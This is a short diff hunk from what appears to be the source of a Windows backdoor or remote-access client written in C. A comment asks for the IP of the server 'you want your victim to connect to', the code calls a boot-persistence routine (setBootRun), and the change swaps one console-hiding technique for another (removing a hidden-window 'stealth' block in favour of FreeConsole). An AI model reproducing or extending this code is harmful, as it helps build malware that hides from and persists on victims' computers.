@@ -103,12 +103,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     // Insert here the IP of your server you want your victim to connect to
     char *ServIP = "";
 
-
-    HWND stealth;
-    AllocConsole();
-    stealth = FindWindowA("ConsoleWindowClass", NULL);
-    
-    ShowWindow(stealth, 0);
+    FreeConsole();
 
     setBootRun();
 
